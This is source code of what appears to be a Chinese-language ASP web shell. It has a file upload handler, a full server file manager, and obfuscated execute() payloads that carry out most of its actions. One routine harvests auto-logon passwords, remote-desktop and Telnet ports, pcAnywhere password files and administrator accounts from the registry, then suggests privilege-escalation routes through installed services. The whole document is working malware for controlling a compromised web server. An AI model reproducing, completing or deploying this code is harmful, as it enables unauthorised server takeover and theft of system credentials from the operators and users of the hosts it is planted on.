function apjdel():set fso=Server.CreateObject(CONST_FSO):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):j"删除完毕!":End function

Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  j cdx&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp本地磁盘 ("&D.DriveLetter&":)</a><br></td></tr>" 
Next
  End Function
Function Show1File(Path) 
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
SI=SI&"<td  height=10 width=17% align=center><div  onMouseOver=""this.style.backgroundColor='#B3D169'"" onMouseOut=""this.style.backgroundColor='#191919'"" style='border:1px solid #dddddd;padding-bottom:4px' id=d><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入"">"
SI=SI&"&nbsp;<font face='wingdings' color='#ffffff' size='6'>0</font>  "
si=si&"<br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='移动'>Move</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")' onclick='return yesok()' class='am' title='下载'>Down</a></div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
j SI &"" : SI="":i=0
SI="<div id=links><table width='100%' align=center id =linklist2><tr><td id=s><b id=x>Filename</b></td><td id=s height=22><b id=x>Size</b></td><td id=s><b id=x>Type</b></td><td id=s><b id=x>Operating</b></td><td id=s><b id=x>Last Modified</b></td><td></td>"
For Each L in Fold.files
SI=SI&"<tr><td height='20' id=d >"
si=si&"<font face='wingdings' color='#ffffff' size='3'>2</font>"
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'>  "&L.Name&"</a><Td id=d>"&clng(L.size/1024)&"K</td><Td id=d>"&L.Type&"</td><Td id=d>"
si=si&"<a href="""&openUrl(PaTh&"\"&L.nAme)&""" class='am' title='Open'>Open</a> "
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
Si=Si&"<a onclick=""window.open('?Action=EditPower&PowerPath="&RepAth(PaTh&"\"&L.nAme)&"','EditPower','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')"" href='###' class='am' title='权限'>权限</a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4:EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2:EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1:EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='1' color=red>x</font>"
else
si=si&"√"
end if
si=si&" <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a></td><td id=d>"&replace(L.DateLastModified,"/","-")&"</td></tr>"
i=i+1
Next
j SI&"</tr></table></div><script>var container = new Array(""linklist2""); var objects = new Array(); var links = new Array(); var tmp = new Array(); var interval = 0; var c=0; function initEventListener() { for(i=0; i < container.length; i++) { objects = document.getElementById(container[i]).getElementsByTagName(""td""); for(j=0; j < objects.length; j++) {    if(document.all) { objects[j].attachEvent(""onmouseover"", resetLinkFade); objects[j].attachEvent(""onmouseout"", startLinkFade); } else {objects[j].addEventListener(""mouseover"", resetLinkFade, false); objects[j].addEventListener(""mouseout"", startLinkFade, false); } var defcol = getPseudoRule(container[i], ""td"");  var hovcol = getPseudoRule(container[i], ""td:hover""); if(defcol.charAt(0) == ""#"") defcol = hex2rgb(defcol); else if(defcol[0] == ""r"") { defcol = defcol.match(/rgb\((\d+), (\d+), (\d+)\)/); defcol = defcol.slice(1);} if(hovcol.charAt(0) == ""#"") hovcol = hex2rgb(hovcol); else if(hovcol[0] == ""r""){ hovcol = hovcol.match(/rgb\((\d+), (\d+), (\d+)\)/); hovcol = hovcol.slice(1); } links[c]     = new Array(); links[c][""object""]  = objects[j]; links[c][""defaultcolor""] = defcol; links[c][""currentcolor""] = defcol; links[c][""hovercolor""] = hovcol; c++; } } } function resetLinkFade(e) { var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { tmp = links[r][""defaultcolor""].clone(); links[r][""currentcolor""] = links[r][""defaultcolor""]; links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } }function startLinkFade(e) {   var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { links[r][""defaultcolor""] = tmp.clone(); links[r][""currentcolor""] = links[r][""hovercolor""].clone(); links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } if(interval == 0) interval = window.setInterval(linkFade,  30); } function linkFade() {  var runners = 0; for(o=0; o<links.length; o++) { var aim  = links[o][""object""]; var defcol = links[o][""defaultcolor""]; var hovcol = links[o][""hovercolor""]; var actcol = links[o][""currentcolor""]; if( defcol[0]+defcol[1]+defcol[2] != actcol[0]+actcol[1]+actcol[2] ) { runners++; actcol[0] = actcol[0]-10 < 25 ? 25 : actcol[0]-10; actcol[1] = actcol[1]-10 < 25 ? 25 : actcol[1]-10; actcol[2] = actcol[2]-10 < 25 ? 25 : actcol[2]-10; aim.style.backgroundColor = rgb2hex(actcol); links[o][""currentcolor""] = actcol; } } if(runners == 0) { window.clearInterval(interval); interval=0; } } function getPseudoRule(parent, element) {  var mysheet =document.styleSheets[0]; var myrule  = mysheet.cssRules || mysheet.rules; for (n = 0; n < myrule.length; n++) if (myrule[n].selectorText.toLowerCase() == ""#""+ parent +"" ""+ element) return myrule[n].style.backgroundColor; else if (myrule[n].selectorText.toLowerCase() == element) return myrule[n].style.backgroundColor; return """"; } function hex2rgb(hex) { var triplet = hex.toLowerCase().replace(/#/, ''); var rgbArr  = new Array();  if(triplet.length == 6) { rgbArr[0] = parseInt(triplet.substr(0,2), 16) ;rgbArr[1] = parseInt(triplet.substr(2,2), 16) ;rgbArr[2] = parseInt(triplet.substr(4,2), 16) ;return rgbArr; } else if(triplet.length == 3){rgbArr[0] = parseInt((triplet.substr(0,1) + triplet.substr(0,1)), 16); rgbArr[1] = parseInt((triplet.substr(1,1) + triplet.substr(1,1)), 16); rgbArr[2] = parseInt((triplet.substr(2,2) + triplet.substr(2,2)), 16); return rgbArr; } else { throw triplet + ' is not a valid color triplet.'; } } function rgb2hex(rgb) { var hexcolors = new Array(""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""a"",""b"",""c"",""d"",""e"",""f""); var r, r1, r2, g, g1, g2, b, b1, b2; r1 = Math.floor(rgb[0] / 16); r2 = rgb[0] - r1*16; g1 = Math.floor(rgb[1] / 16); g2 = rgb[1] - g1*16; b1 = Math.floor(rgb[2] / 16); b2 = rgb[2] - b1*16; r = hexcolors[r1] + hexcolors[r2]; g = hexcolors[g1] + hexcolors[g2]; b = hexcolors[b1] + hexcolors[b2]; return ""#""+r+g+b; } Object.prototype.clone = function(deep) { var objectClone = new this.constructor(); for (var property in this) if (!deep) objectClone[property] = this[property]; else if (typeof this[property] == 'object') objectClone[property] = this[property].clone(deep); else {objectClone[property] = this[property]; }return objectClone; } "&VBNEWLINE
if ysjb=true then j "initEventListener();</script>":end if
Set FOLD=Nothing
End function
Function DelFile(Path)
execute(king("yC rfS┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成除删 `&izqY&` 件文您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊izqY tsoXtztstW.XZ┊ftiJ )izqY(lzlobStsoX.XZ yC"))
End Function
Function EditFile(Path)
execute(king("`>dkgy/<>'tcqU'=txsqc 'zodwxl'=thnz 'zodwxl'=tdqf zxhfo<;hlwf&;hlwf&;hlwf&>'ztltN'=txsqc 'ztltk'=thnz 'ztltk'=tdqf zxhfo<;hlwf&;hlwf&;hlwf&>';)(aeqw.nkgzloi'=aeosefg 'aeqA'=txsqc 'fgzzxw'=thnz 'aeqwgu'=tdqf zxhfo<>ki<>kw<>qtkqzbtz/<`&zbJ&`>'167:ziuoti;%110:izrov'=tsnzl 'zftzfgZ'=tdqf qtkqzbtz<>kw<>'%110:izrov'=tsnzl '`&izqY&`'=txsqc 'tdqGX'=tdqf zxhfo<>'ftrroi'=thnJ 'tsoXzorS'=txsqc 'fgozeQ'=tdqf zxhfo<>'dkgXzorS'=tdqf 'zlgh'=rgiztd 'zlgY=9fgozeQ?`&VNM&`'=fgozeq dkgX<` p┊yC rfS┊WQAkzl=zbJ:`hlq.sstil\`&)`izqYktrsgX`(fgolltU=izqY┊tlsS┊ufoizgG=J ztU┊tlgse.J┊ )ssqrqtk.J(trgefSVTJD=zbJ┊)tlsqX ,0 ,izqY(tsoyzbtzfthg.XZ=J ztU┊ftiJ ``><izqY yC┊yC rfS┊rfS.tlfghltN┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成存保件文您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊ufoizgf=J ztU┊tlgse.J┊)`zftzfge`(dkgy.zltxjtN tfoVtzokK.J┊)izqY(tsoXzbtJtzqtkZ.XZ=J ztU┊ftiJ `zlgY`=)`9fgozeQ`(zltxjtN yC"))
End Function
Function CopyFile(Path)
execute(king("yC rfS┊ CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成制复`&)1(izqY&`件文您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊)0(izqY,)1(izqY tsoXnhgZ.XZ┊ftiJ ``><)0(izqY rfq ))1(izqY(lzlobStsoX.XZ yC┊)`||||`,izqY(zoshU=izqY"))
End Function
Function MoveFile(Path)
execute(king("yC rfS┊ CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成动移`&)1(izqY&`件文您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊)0(izqY,)1(izqY tsoXtcgT.XZ┊ftiJ ``><)0(izqY rfq ))1(izqY(lzlobStsoX.XZ yC┊)`||||`,izqY(zoshU=izqY"))
End Function
Function DelFolder(Path)
execute(king("yC rfS┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成除删`&izqY&`录目您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊izqY ktrsgXtztstW.XZ┊ftiJ )izqY(lzlobSktrsgX.XZ yC"))
End Function
Function CopyFolder(Path)
execute(king("yC rfS┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成制复`&)1(izqY&`录目您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊)0(izqY,)1(izqY ktrsgXnhgZ.XZ┊ftiJ ``><)0(izqY rfq ))1(izqY(lzlobSktrsgX.XZ yC┊)`||||`,izqY(zoshU=izqY"))
End Function
Function MoveFolder(Path)
execute(king("yC rfS┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成动移`&)1(izqY&`录目您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊)0(izqY,)1(izqY ktrsgXtcgT.XZ┊ftiJ ``><)0(izqY rfq ))1(izqY(lzlobSktrsgX.XZ yC┊)`||||`,izqY(zoshU=izqY"))
End Function
Function NewFolder(Path)
execute(king("yC rfS┊CU p┊skMaeqA&CU=CU┊`>ktzfte/<！功成建新`&izqY&`录目您喜恭>kw<>kw<>kw<>ktzfte<`=CU┊izqY ktrsgXtzqtkZ.XZ┊ftiJ ``><izqY rfq )izqY(lzlobSktrsgX.XZ zgG yC"))
End Function
End Class

sub getTerminalInfo()
execute(king("yo rfS┊`码密tktivnfQeh到得解破并载下录目认默从以可,件文码密tktivnfQeh_现发>os<`p┊ftiJ )`yoe.`&tdqfktcktl&`\etzfqdnU\qzqW fgozqeoshhQ\lktlM ssQ\lufozztU rfQ lzftdxegW\`&ktcokrlnl(lzlobStsoX.gly yC┊)`tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD`(rqtNutN.ilv=tdqfktcktl┊)9,)9(ktrsgXsqoethlztE.glX(zyts=tcokrlnU┊)BUX_JUGBZ(zetpwgtzqtkZ.ktcktU=gly ztU┊zbtG┊yo rfS┊yo rfS┊`>kw<马木YDY入写且并,录目soqTwtK找查以可,动启限权dtzlnUsqegV以且,soqdfoK eouqT_有中器务服>os<`p┊ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo┊ftiJ )`soqdfov`,)tdqG.teocktUpwg(tlqes(kzlfo yo┊yo rfS┊yo rfS┊`>kw<权提马木hlR用使虑考以可,动启限权dtzlnUsqegV以且,zqedgJ_有中器务服>os<`p┊ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo┊ftiJ )`zqedgz`,)tdqG.teocktUpwg(tlqes(kzlfo yo┊yo rfS┊yo rft┊yo rfS┊`>kw<马木YDY虑考以可,dtzlnUsqegV为限权动启,在存务服tieqhQ_有中器务服>os< `p┊tlsS┊`>kw<权提接直以可.tieqhQ为器务服ASK前当>os<`p┊ftiJ )`tieqhQ`,)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN(kzlfo yC┊ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo┊ftiJ `tieqhq`=)tdqG.teocktUpwg(tlqes yo┊yo rfS┊yo rfS┊`>kw<权提具工tbt.xl用虑考以可,动启限权dtzlnUsqegV以且,装安M-cktU_有中器务服>os<`p┊ftiJ `dtzlnUsqegV`=tdqGzfxgeeQteocktU.teocktUpwg yo┊ftiJ `M-cktU`=tdqG.teocktUpwg yo┊ktzxhdgZpwg fC teocktUpwg ieqS kgX┊zbtG tdxltN kgkkS fB┊)`teocktU`(nqkkQ = ktzsoX.ktzxhdgZpwg┊)`fgozqeoshhQ.sstiU`(zetpwBtzqtkZ.ktcktU = ql ztU┊)`.//:JGfoK`(zetpwBztE = ktzxhdgZpwg ztU┊`>ki<>kw<]测探点_弱器务服[`p┊`>kw<>kw<>kw<------------------------------------`p┊`>kw<`&aa&`:为卡网_动活前当>os<`p┊)ai(rqtNutN.ilv=aa┊`zfxgZ\dxfS\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD`=ai┊`>kw<`&sdzf&`:为置设sdzG ztfstJ>os<`p┊0=sdzG ftiJ ``=sdzf yo┊)ntaVTJG(rqtNutN.ilK=sdzf┊`VTJG\1.0\ktcktUztfstJ\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntaVTJG┊`>kw<`&nshlor&`:户用入登次_上示显否是>os<`p┊`否`=nshlor tlst `是`=nshlor ftiJ 1=fougshlor kg ``=fougshlor yC┊)`tdqGktlMzlqVnqshloWzfgW\dtzlnU\ltoeosgY\fgolktIzftkkxZ\lvgrfoK\zyglgkeoT\tkqvzygU\SGCDZQT_VQZBV_OSFD`(rqtNutk.ilv=fougshlor┊yo rfS┊`>zfgy/<>kw<`&rvllqY&`:码密>rtk=kgsge zfgy<>tkqxjl=thnz os<`p┊`>kw<`&fodrQ&`:名户用>tkqxjl=thnz os<`p┊)`rkgvllqYzsxqytW\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=rvllqY┊)`tdqGktlMzsxqytW\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`(rqtNutN.ilK=fodrQ┊`>kw<用启:入登动_自户用>os<`p┊tlsS┊`>kw<用启未:入登动_自户用>os<`p┊ftiJ ``=fougsgzxQ kg 1=fougsgzxQ yo┊)fougsgzxQlo(rqtNutN.ilK=fougsgzxQ┊`fgugVfodrQgzxQ\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=fougsgzxQlo┊`>zfgy/<>kw<`&tdqGfodrQ&`>rtk=kgsge zfgy<:为名户用员`&`理管认默>os<`p┊┊yo rft┊`akgvztG.zhokelK:啊行不的奶奶他`p┊ftiz kkt yo┊zbtG┊`>os/<>zfgy/<>kw<`&tdqG.fodrq&`：组员理管前当>rtk=kgsge zfgy<>os<` p┊lktwdtT.hxgkEpwg fo fodrq ieqS kgX┊)`hxgku,lkgzqkzlofodrQ/`&tdqGktzxhdgZ.Gz&`//:JGfoK`(zetpwBztE=hxgkEpwg ztU┊)`akgvztG.zhokelK`(zetpwBtzqtke.ktcktl=Gz ztU┊ zbtf tdxltk kgkkt fg┊1=ltkohbS.tlfghltN┊`kgzqkzlofodrQ`=tdqGfodrQ ftiJ ``=tdqffodrq yo┊)ntFtdqGfodrQ(rqtNutN.ilv=tdqGfodrQ┊`tdqGktlMzsxqytWzsQ\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntFtdqGfodrQ┊`>kw<`&tdqfeh&`:为名机_主前当>os<`p┊`>kw<.名机主取_读法无`=tdqfeh ftiJ ``=tdqfeh yo┊)ntatdqfeh(rqtNutN.ilv=tdqfeh┊`tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD`=ntatdqfeh┊`>0=tmol ki<>kw<]测探_置设统系[>kw<>kw<`p┊zbtf┊`>kw<`&)o(lizqh&`>os<`p┊)lizqh(rfxgwM gz )lizqh(rfxgwV=o kgX┊`>kw<:量变径路_前当统系`p┊`>kw<------------------------------------`p┊)`;`,izqYzygU(zoshl=lizqh┊`>kw<持支:_件软毒杀列系星瑞>os<`p ftiJ )`ufolok`,gyfoizqY(kzlfo yo┊`>kw<持支:_件软毒杀克铁门赛>os<`p ftiJ )`lxkocozfq`,gyfoizqY(kzlfo yo┊`>kw<持支:_件软毒杀列系山金 >os<`p ftiJ )`cqa`,gyfoizqY(kzlfo yo┊`>kw<持支:_件软毒杀ssoF>os<`p ftiJ )`ssoF`,gyfoizqY(kzlfo yo┊`>kw<持支:_制控tktivnfQeY克铁门赛>os<`p ftiJ )`tktivnfqeh`,gyfoizqY(kzlfo yo┊`>kw<持支:_器务服TXZ>os<`p ftiJ )`4bdfgolxye`,gyfoizqY(kzlfo yo┊`>kw<持支:_务服库据数tseqkB>os<`p ftiJ )`tseqkg`,gyfoizqY(kzlfo yo┊`>kw<持支:_务服库据数VHUnT>os<`p ftiJ )`sjlnd`,gyfoizqY(kzlfo yo┊`>kw<持支:_务服库据数VHUUT>os<`p ftiJ )`ktcktl sjl zyglgkeod`,gyfoizqY(kzlfo yo┊`>kw<持支:_本脚qcqR>os<`p ftiJ )`qcqp`,gyfoizqY(kzlfo yo┊`>kw<持支:_本脚sktY>os<`p ftiJ )`skth`,gyfoizqY(kzlfC yo┊`:持支件`&`软统系`p┊)izqYzygU(tlqes=gyfoizqY┊)`izqY`(dtzo.zftdfgkocfS.ilK=izqYzygU┊`>0=tmol ki<>kw<]测探件_软统系[>kw<>kw<>kw<`p┊`>sg/<`p┊yC rfS┊`>kw<` & rkgvllqYfougVgzxq & ` :码密户帐的`&`录登动自`p┊yC rfS┊`tlsqX`p┊kqtsZ.kkS┊ftiJ kkS yC┊)ntFllqYfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = rkgvllqYfougVgzxq┊`>kw<` & tdqfktlMfougVgzxq & ` :户帐统系的`&`录登动自`p┊)ntFktlMfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = tdqfktlMfougVgzxq┊tlsS┊ftiJ 1 = tswqfSfougVgzxQlo yC┊)ntFtswqfSfougVgzxq & izqYfougVgzxq(rqtNutN.Llv = tswqfSfougVgzxQlo┊`rkgvllqYzsxqytW` = ntFllqYfougVgzxq┊`tdqGktlMzsxqytW` = ntFktlMfougVgzxq┊`fgugVfodrQgzxQ` = ntFtswqfSfougVgzxq┊`\fgugsfoK\fgolktIzftkkxZ\JG lvgrfoK\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD` = izqYfougVgzxq┊yC rfS┊`>/kw<` & zkgYdktz & ` :口端`&`务服端终前当`p┊tlsS ┊`>/kw<.制限到受否是限权查检 ,口端端终到得法无`p┊ ftiJ 1 >< ktwdxG.kkS kB `` = zkgYdktz yC┊`>sg<录登动自及`&`口端务服_端终`p┊)ntFzkgYsqfodktz & izqYzkgYsqfodktz(rqtNutN.Llv = zkgYdktz┊`ktwdxGzkgY` = ntFzkgYsqfodktz┊`\heJ-YWN\lfgozqzUfoK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD` = izqYzkgYsqfodktz┊rkgvllqYfougVgzxq ,tdqfktlMfougVgzxq ,ntFtswqfSfougVgzxq ,tswqfSfougVgzxQlo doW┊ntFllqYfougVgzxq ,ntFktlMfougVgzxq ,izqYfougVgzxq doW┊zkgYdktz ,ntFzkgYsqfodktz ,izqYzkgYsqfodktz doW┊)`sstiU.zhokeUK`(zetpwBtzqtkZ.ktcktU = Llv ztU┊`------------------------------------------------------`p┊`>kw<`&zkgYKQY&`:为口端tktivnfQeY>os<`p┊`tktivnfQeh装安否`&`是机主`&`认确请.取获`&`法无`=zkgYKQY ftiz ``=zkgYKQY yC┊)ntFtktivnfQeh(rqtNutN.ilK=zkgYKQY┊`zkgYqzqWYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntFtktivnfQeh┊`>zfgy/<>kw<`&zkgYdktJ&`>rtk=kgsge zfgy<:为口端teocktU sqfodktJ>os<`p┊`机主本版ktcktU lvgrfoK为否是`&`认确请.取读`&`法无`=zkgYdktJ ftiJ ``=zkgYdktJ yC┊)ntFdktJ(rqtNutN.ilK=zkgYdktJ┊`ktwdxGzkgY\hez\lrJ\rvhrk\lrK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\SGCDZQT_VQZBV_OSFD`=ntFdktJ┊`>kw<`&zkghzfsJ&`:口`&`端ztfstJ>os<`p┊`)置设`&`认默(89`=zfsJ ftiJ ``=zkgYzfsJ yo┊)ntFztfstJ(rqtNutN.ilK=zkgYzfsJ┊`zkgYztfstJ\1.0\ktcktUztfstJ\zyglgkeoT \SNQKJXBU\SGCDZQT_VQZBV_OSFD`=ntaztfstJ┊`>0=tmol ki<>kw<]测探`&`口端`&`殊特[>kw<>kw<`p┊yo rft┊zbtG┊`>kw<------------------------------------------------`p┊yo rfS┊yo rfS┊`>kw<`p┊zbtf┊`,`&)p(vgssqYWM p┊)vgssqhrx(rfxgAM gJ )vgssqhrx(rfxgAV = p kgy┊`:为口端hrx的`&`许允>os<`p┊tlsS┊`>kw<部全:为口端hrx的`&`许允>os<`p┊ftiJ 1=)1(vgssqhrx kg ``=)1(vgssqhrx yC┊)YWMssxX(rqtNutN.ilK=vgssqhrx┊yo rfS┊`>kA<`p┊zbtG┊`,`&)p(vgssqhez p┊)vgssqhez(rfxgAM gJ )vgssqhez(rfxgAV = p kgX┊`:为口端hez的`&`许允>os<`p┊tlsS┊`>kw<部全:为口端hez的`&`许允>os<`p┊ftiJ 1=)1(vgssqhez kg ``=)1(vgssqhez yC┊)YZJssxX(rqtNutN.ilK=vgssqhez┊FMS&ArhQ&izqh=YWMssxX┊FJS&ArhQ&izqY=YZJssxX┊`lzkgYrtvgssQYWM\`=FMS┊`lzkgYrtvgssQYZJ\`=FJS┊tlst┊`>kw<选筛YC/heJ没>os<`p┊ ftiJ 0=ktzsoyhohezgG yo┊yC rfS┊`>kw<置设有没或取读法无UGW`&`认默>os<`p┊tlsS┊`>kw<`&kzlUGW&`:为UGW`&`卡网>os<`p┊ftiJ ``><kzlUGW yC┊)ntFUGW(rqtNutN.ilK=kzlUGW┊`ktcktUtdqG\`&ArhQ&izqY=ntFUGW┊yo rfS┊`>kw<置设有没或取读法无关网>os<`p┊tlsS┊zbtG┊`>kw<`&)p(nqvtzqE&`:`&p&`关网>os<`p┊)nqvtzqE(rfxgwM gz )nqvtzqE(rfxgwV=p kgX┊ftiJ )nqKtzqE(nqkkqlo yC┊)ntFnqKtzqE(rqtkutN.ilK=nqKtzqE┊`nqvtzqEzsxqytW\`&ArhQ&izqY=ntFnqKtzqE┊yo rfS┊`>kw<置设有没或`&`取读法无址`&`地YC>os<`p┊tlsS┊zbtG┊`>kw<`&)p(krrQYC&`:为`&p&`址`&`地YC>os<`p┊)krrQYC(rfxgwM gz )krrQYC(rfxgwV=p kgX┊ftiJ ``><)1(krrqYC yC┊)ntFYC(rqtkutN.ilK=krrqYC┊`lltkrrQYC\`&ArhQ&izqY=ntFYC┊`\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD`=izqY┊`>kw<`&ArhQ&`:为列序的`&o&`卡网`p┊)``,`\teoctW\`,)o(lrhQ(teqshtN=ArhQ┊0-)lrhQ(rfxgAM gJ )lrhQ(rfxgAV=o kgX┊ ftiJ )lrhQ(nqkkQlC yC┊)ntFrhQ(rqtNutN.ilK=lrhQ┊`rfoA\tuqafoV\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD`=ntFrhQ┊yC rfS┊0=ktzsoyhohezgG┊ftiJ ``=tswqfSlo kg 1=tswqfSlo 